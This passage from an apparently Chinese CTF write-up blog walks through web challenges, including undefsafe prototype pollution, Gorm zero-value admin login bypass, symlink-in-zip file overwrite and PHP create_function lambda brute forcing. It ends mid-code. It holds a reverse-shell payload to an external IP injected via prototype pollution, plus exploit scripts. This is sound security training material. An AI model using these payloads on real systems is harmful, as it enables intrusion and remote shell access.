class="hljs-property">stack</span>);<br>  res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Something broke!&#x27;</span>);<br>&#125;);<br><br><br><span class="hljs-keyword">const</span> port = <span class="hljs-number">8080</span>;<br>app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Example app listening at http://localhost:<span class="hljs-subst">$&#123;port&#125;</span>`</span>))<br></code></pre></td></tr></table></figure><p>可以看到用了<code>undefsafe</code>这么个东西，搜了下存在原型链污染：</p><p><a href="https://skysec.top/2020/06/22/CVE-2019-10795-undefsafe-Prototype-Pollution-Vulnerability/">参考文章</a></p><p>简单说<code>undefsafe</code>就和<code>merge/clone</code>似的，比如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br><span class="hljs-keyword">var</span> object = &#123;<br>    <span class="hljs-attr">a</span>: &#123;<br>        <span class="hljs-attr">b</span>: &#123;<br>            <span class="hljs-attr">c</span>: <span class="hljs-number">1</span>,<br>            <span class="hljs-attr">d</span>: [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],<br>            <span class="hljs-attr">e</span>: <span class="hljs-string">&#x27;skysec&#x27;</span><br>        &#125;<br>    &#125;<br>&#125;;<br><br><span class="hljs-keyword">var</span> payload = <span class="hljs-string">&quot;__proto__.toString&quot;</span>;<br><span class="hljs-title function_">a</span>(object,payload,<span class="hljs-string">&quot;evilstring&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object.<span class="hljs-property">toString</span>);<br><span class="hljs-comment">//evilstring</span><br><span class="hljs-comment">//当undefsafe第2，3个参数可控时，我们可以污染object的值</span><br></code></pre></td></tr></table></figure><p>然后就是找利用这个函数的地方：存在<code>get_note</code>和<code>edit_note</code>两个方法(以及对应路由)：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs js">   <span class="hljs-title function_">get_note</span>(<span class="hljs-params">id</span>) &#123;<br>       <span class="hljs-keyword">var</span> r = &#123;&#125;<br>       <span class="hljs-title function_">undefsafe</span>(r, id, <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id));<br>       <span class="hljs-keyword">return</span> r;<br>   &#125;<br><br>   <span class="hljs-title function_">edit_note</span>(<span class="hljs-params">id, author, raw</span>) &#123;<br>       <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.author&#x27;</span>, author);<br>       <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.raw_note&#x27;</span>, raw);<br>   &#125;<br><span class="hljs-comment">//路由：</span><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/notes&#x27;</span>)<br>   .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>       <span class="hljs-keyword">let</span> q = req.<span class="hljs-property">query</span>.<span class="hljs-property">q</span>;<br>       <span class="hljs-keyword">let</span> a_note;<br>       <span class="hljs-keyword">if</span> (<span class="hljs-title function_">typeof</span>(q) === <span class="hljs-string">&quot;undefined&quot;</span>) &#123;<br>           a_note = notes.<span class="hljs-title function_">get_all_notes</span>();<br>       &#125; <span class="hljs-keyword">else</span> &#123;<br>           a_note = notes.<span class="hljs-title function_">get_note</span>(q);<br>       &#125;<br>       res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;note&#x27;</span>, &#123;<span class="hljs-attr">list</span>: a_note&#125;);<br>   &#125;)<br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/edit_note&#x27;</span>)<br>   .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>       res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to edit a note&quot;</span>&#125;);<br>   &#125;)<br>   .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>       <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">body</span>.<span class="hljs-property">id</span>;<br>       <span class="hljs-keyword">let</span> author = req.<span class="hljs-property">body</span>.<span class="hljs-property">author</span>;<br>       <span class="hljs-keyword">let</span> enote = req.<span class="hljs-property">body</span>.<span class="hljs-property">raw</span>;<br>       <span class="hljs-keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;<br>           notes.<span class="hljs-title function_">edit_note</span>(id, author, enote);<br>           res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note sucess&quot;</span>&#125;);<br>       &#125; <span class="hljs-keyword">else</span> &#123;<br>           res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note failed&quot;</span>&#125;);<br>       &#125;<br>   &#125;)<br></code></pre></td></tr></table></figure><p>不过<code>get_note</code>那个应用不了不知道为啥(网上看其它师傅都直接用<code>edit_note</code>这个路由了)🤔这个路由下<code>id,author,enote</code>全部可控，然后和<code>/status</code>路由配合实现命令执行(注意这玩意儿没回显，去反弹shell)。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /edit_note<br><br><span class="hljs-attribute">id</span>=__proto__ &amp; author = bash -i &gt; /dev/tcp/<span class="hljs-number">101.32.189.145</span>/<span class="hljs-number">9001</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span> &amp; raw = shadouxing;<br></code></pre></td></tr></table></figure><h2 id="HGAME-week2-WebVPN"><a href="#HGAME-week2-WebVPN" class="headerlink" title="[HGAME-week2]WebVPN"></a>[HGAME-week2]WebVPN</h2><p><code>user/info</code>路由下存在原型链污染：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/user/info&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>) &#123;<br>    res.<span class="hljs-title function_">sendStatus</span>(<span class="hljs-number">403</span>);<br>  &#125;<br>  <span class="hljs-title function_">update</span>(userStorage[req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>].<span class="hljs-property">info</span>, req.<span class="hljs-property">body</span>);<br>  res.<span class="hljs-title function_">sendStatus</span>(<span class="hljs-number">200</span>);<br>&#125;);<br><br><span class="hljs-comment">//update函数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">dst, src</span>) &#123;<br>  <span class="hljs-keyword">for</span> (key <span class="hljs-keyword">in</span> src) &#123;<br>    <span class="hljs-keyword">if</span> (key.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;__&quot;</span>) != -<span class="hljs-number">1</span>) &#123;<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> src[key] == <span class="hljs-string">&quot;object&quot;</span> &amp;&amp; dst[key] !== <span class="hljs-literal">undefined</span>) &#123;<br>      <span class="hljs-title function_">update</span>(dst[key], src[key]);<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    dst[key] = src[key];<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过原型链污染调用<code>Object</code>给<code>strategy</code>添加某些属性(注意content-type)：</p><p><img src="/img/hgamewebvpn4.png" alt="hgamewebvpn4"></p><p>再访问<code>/home</code>：</p><p><img src="/img/hgamewebvpn5.png" alt="hgamewebvpn5"></p><p>然后<code>proxy?url=http://127.0.0.1:3000/flag</code>即可。</p><h2 id="HGAME-week3-Zero-Link"><a href="#HGAME-week3-Zero-Link" class="headerlink" title="[HGAME-week3]Zero Link"></a>[HGAME-week3]Zero Link</h2><p><a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18030979">参考文章</a></p><p><a href="https://www.ctfiot.com/123387.html">Go语言特性引发的安全问题的思考</a></p><blockquote><p>Go这门语言本身对于“零值”的设计：他是无法区分某个结构体中某个字段是否有被赋值过。</p></blockquote><p>如何获得<code>Admin</code>的密码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetUserByUsernameOrToken</span><span class="hljs-params">(username <span class="hljs-type">string</span>, token <span class="hljs-type">string</span>)</span></span> (*User, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">var</span> user User<br>query := db<br><span class="hljs-keyword">if</span> username != <span class="hljs-string">&quot;&quot;</span> &#123;<br>query = query.Where(&amp;User&#123;Username: username&#125;)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>query = query.Where(&amp;User&#123;Token: token&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>如果传入<code>username</code>的值是<code>xxx</code>，生成的对应数据库查询语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> `<span class="hljs-keyword">user</span>` <span class="hljs-keyword">WHERE</span> `username` <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;xxx&#x27;</span> LIMIT <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>但如果传空字符串，Gorm在⽣成SQL语句时不会为该属性⽣成条件语句:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> `<span class="hljs-keyword">user</span>` LIMIT <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>这时他会查到表里的第一个用户(<code>sqlite.go</code>告诉了，第一个就是管理员)。</p><p><img src="/img/zerolink3-170911121745111.png" alt="zerolink3"></p><p>登录后存在文件上传+解压功能，和解压有关的部分：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> _, file := <span class="hljs-keyword">range</span> files &#123;<br>cmd := exec.Command(<span class="hljs-string">&quot;unzip&quot;</span>, <span class="hljs-string">&quot;-o&quot;</span>, file, <span class="hljs-string">&quot;-d&quot;</span>, <span class="hljs-string">&quot;/tmp/&quot;</span>) <span class="hljs-comment">//主要是 -o这个东西，表示覆盖已存在的文件而不提示用户。后面的思路就是利用这个通过软链接覆盖拿flag</span><br><span class="hljs-keyword">if</span> err := cmd.Run(); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, FileResponse&#123;<br>Code:    http.StatusInternalServerError,<br>Message: <span class="hljs-string">&quot;Failed to unzip file: &quot;</span> + file,<br>Data:    <span class="hljs-string">&quot;&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>/api/secret</code>实现了特定文件读取：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ReadSecretFile</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>secretFilepath := <span class="hljs-string">&quot;/app/secret&quot;</span><br>content, err := util.ReadFileToString(secretFilepath)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, FileResponse&#123;<br>Code:    http.StatusInternalServerError,<br>Message: <span class="hljs-string">&quot;Failed to read secret file&quot;</span>,<br>Data:    <span class="hljs-string">&quot;&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这里就是利用软链接配合<code>unzip</code>实现对<code>./app/secret</code>下假flag的覆盖:</p><p><strong>软链接将某个目录连接到另一个目录或者文件下，那么我们以后对这个目录的任何操作，都会作用到另一个目录或者文件下。</strong></p><p>首先(这里先建立一个到<code>/app</code>的软链接)：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /app <span class="hljs-built_in">link</span><br>zip --symlinks 1.zip <span class="hljs-built_in">link</span><br></code></pre></td></tr></table></figure><p>压缩完了把这个link删了，创建<code>link/secret</code>，<code>secret</code>里面内容是<code>/flag</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">zip</span> -r <span class="hljs-number">2.</span><span class="hljs-built_in">zip</span> link <br></code></pre></td></tr></table></figure><p>这时<code>(link/secret)</code>- &gt;<code>/app/secret</code>，读它等于读<code>/flag</code>。</p><p>依次上传<code>1.zip</code>，<code>2.zip</code>(传一次就访问<code>api/unzip</code>进行解压)。再访问<code>/api/secret</code>就行：</p><p><img src="/img/zerolink4.png" alt="zerolink4"></p><p>最后这题还有个小坑：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> (ext != <span class="hljs-string">&quot;.zip&quot;</span>) || (file.Header.Get(<span class="hljs-string">&quot;Content-Type&quot;</span>) != <span class="hljs-string">&quot;application/zip&quot;</span>) &#123;<br>c.JSON(http.StatusBadRequest, FileResponse&#123;<br>Code:    http.StatusBadRequest,<br>Message: <span class="hljs-string">&quot;Only .zip files are allowed&quot;</span>,<br>Data:    <span class="hljs-string">&quot;&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><p>前端检查文件的内容类型是否为 “application&#x2F;zip”，但windows下上传压缩包一般是<code>application/x-zip-compressed</code>，这玩意儿还不能抓包改。解决方法要么用<code>Linux</code>的浏览器传要么写个脚本传：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#脚本参考https://www.cnblogs.com/gxngxngxn/p/18012905</span><br><span class="hljs-keyword">import</span> requests<br><br>Cookie=&#123;<span class="hljs-string">&quot;session&quot;</span>:<span class="hljs-string">&quot;MTcwNzk5ODExOXxEWDhFQVFMX2dBQUJFQUVRQUFBbl80QUFBUVp6ZEhKcGJtY01DZ0FJZFhObGNtNWhiV1VHYzNSeWFXNW5EQWNBQlVGa2JXbHV8_LDldFLPPX3ke76aWroLAK2oFDpN-3gU6pg7-OpdtM0=&quot;</span>&#125;<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_zip_file</span>(<span class="hljs-params">url, file_path</span>):<br>    <span class="hljs-keyword">try</span>:<br>        file_name = <span class="hljs-string">&#x27;2.zip&#x27;</span>  <span class="hljs-comment"># 指定要上传的文件名</span><br>        files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: (file_name, <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;rb&#x27;</span>), <span class="hljs-string">&#x27;application/zip&#x27;</span>)&#125;<br>        response = requests.post(url, files=files,cookies=Cookie)<br><br>        <span class="hljs-keyword">if</span> response.status_code == requests.codes.ok:<br>            <span class="hljs-built_in">print</span>(response.text)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;文件上传成功！&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;文件上传失败！&quot;</span>)<br><br>    <span class="hljs-keyword">except</span> IOError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;文件打开错误：<span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># 示例用法</span><br>upload_url = <span class="hljs-string">&quot;http://106.14.57.14:30864/api/upload&quot;</span><br>zip_file_path = <span class="hljs-string">&quot;C:\\Users\\86183\\Desktop\\fsdownload\\2.zip&quot;</span><br>upload_zip_file(upload_url, zip_file_path)<br></code></pre></td></tr></table></figure><h2 id="SUCTF-2018-annonymous"><a href="#SUCTF-2018-annonymous" class="headerlink" title="[SUCTF 2018]annonymous"></a>[SUCTF 2018]annonymous</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$MY</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;die(`cat flag.php`);&quot;</span>);<br><span class="hljs-variable">$hash</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="hljs-number">32</span>));<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;function SUCTF_<span class="hljs-subst">$hash</span>()&#123;&quot;</span><br>    .<span class="hljs-string">&quot;global \$MY;&quot;</span><br>    .<span class="hljs-string">&quot;\$MY();&quot;</span><br>    .<span class="hljs-string">&quot;&#125;&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func_name&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;func_name&quot;</span>]();<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>); <br></code></pre></td></tr></table></figure><p>利用<code>create_function</code>创建了一个函数然后给<code>$MY</code>。再利用<code>eval</code>创建了一个函数的定义：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">SUCTF_</span>$<span class="hljs-title">hash</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">global</span> \<span class="hljs-variable">$MY</span>;<br>\<span class="hljs-variable">$MY</span>();<br>&#125;;<br></code></pre></td></tr></table></figure><p>然后<code>GET</code>传参<code>func_name</code>，可以进行函数调用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func_name&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;func_name&quot;</span>]();<br>    <span class="hljs-keyword">die</span>();<br></code></pre></td></tr></table></figure><p>所以现在的问题就是<code>$hash = bin2hex(openssl_random_pseudo_bytes(32))</code>这个东西。。这个伪随机数不知道怎么处理，<code>SUCTF_$hash()</code>这个函数不知道名字执行不了。</p><p><a href="https://blog.csdn.net/mochu7777777/article/details/105225558">参考资料</a></p><p><a href="https://yang1k.github.io/post/2018-suctf/">参考资料</a></p><blockquote><p>create_function的匿名函数也是有名字的，名字是\x00lambda_%d，其中%d代表他是当前进程中的第几个匿名函数</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$MY</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;die(`cat flag.php`);&quot;</span>);<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$MY</span>);<br><span class="hljs-comment">//输出string(9) &quot;(这是一个不可见字符)lambda_1&quot;，后面的数字是随机变的。</span><br></code></pre></td></tr></table></figure><p>可以用<code>burp</code>的<code>intruder</code>模块爆破，或者：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://e50c90bb-2a05-4887-8d21-139d4eaa33de.node5.buuoj.cn:81/&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">5000</span>):<br>    payload = <span class="hljs-string">&quot;\x00lambda_&#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>    get_data = &#123;<span class="hljs-string">&quot;func_name&quot;</span>: payload&#125;<br>    res = requests.get(url, params=get_data, timeout=<span class="hljs-number">5</span>)<br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    <span class="hljs-keyword">if</span> res.status_code == <span class="hljs-number">200</span>:<br>        <span class="hljs-built_in">print</span>(res.text)<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><p><img src="/img/nininhanshu.png" alt="nininhanshu"></p><p>这周hgame一道题都没做出来:(就把VNCTF的题放在前面了，HGAME的就写了下卡住前有的一点点思路😂</p><h2 id="VNCTF-CheckIn"><a href="#VNCTF-CheckIn" class="headerlink" title="[VNCTF]CheckIn"></a>[VNCTF]CheckIn</h2><p>打砖块小游戏，右键看源码存在<code>goodGame()</code>函数，里面有这么个东西：</p><p><img src="/img/vnctfcheckin.png" alt="vnctfcheckin"></p><p>十六进制解码就行：</p><p><code>VNCTF&#123;W31c0m3_t0_VNCTF_2024_g@od_J0B!!!!&#125;</code></p><h2 id="VNCTF-givenphp"><a href="#VNCTF-givenphp" class="headerlink" title="[VNCTF]givenphp"></a>[VNCTF]givenphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;upload&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">handleFileUpload</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;challenge&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">waf</span>();<br>    <span class="hljs-variable">$value</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;value&#x27;</span>];<br>    <span class="hljs-variable">$key</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>];<br>    <span class="hljs-variable">$func</span>=<span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;putenv(&#x27;<span class="hljs-subst">$key</span>=<span class="hljs-subst">$value</span>&#x27;);&quot;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$func</span>==<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;guess&#x27;</span>])&#123;<br>        <span class="hljs-variable">$func</span>();<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;whoami&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\&#x27;|&quot;|%|\(|\)|;|bash/i&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>])||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\&#x27;|&quot;|%|\(|\)|;|bash/i&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;value&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;evil input!!!&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span 